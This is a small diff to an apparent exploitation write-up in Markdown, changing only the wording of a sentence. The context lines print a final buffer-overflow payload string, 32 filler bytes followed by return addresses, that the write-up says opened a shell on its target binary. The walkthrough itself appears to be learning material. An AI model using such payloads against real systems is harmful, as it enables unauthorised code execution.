@@ -426,7 +426,7 @@ coucou
 ls
 exploit.py  list_directory  README.md
 ```
-We successfully opened a shell, our final payload is : `"\x41"*32+"\x1a\x12\x40\x00"+"\x00"*4+"\x76\x11\x40\x00"+"\x00"*4`.
+We've successfully opened a shell, our final payload is : `"\x41"*32+"\x1a\x12\x40\x00"+"\x00"*4+"\x76\x11\x40\x00"+"\x00"*4`.
 
 # Script
 
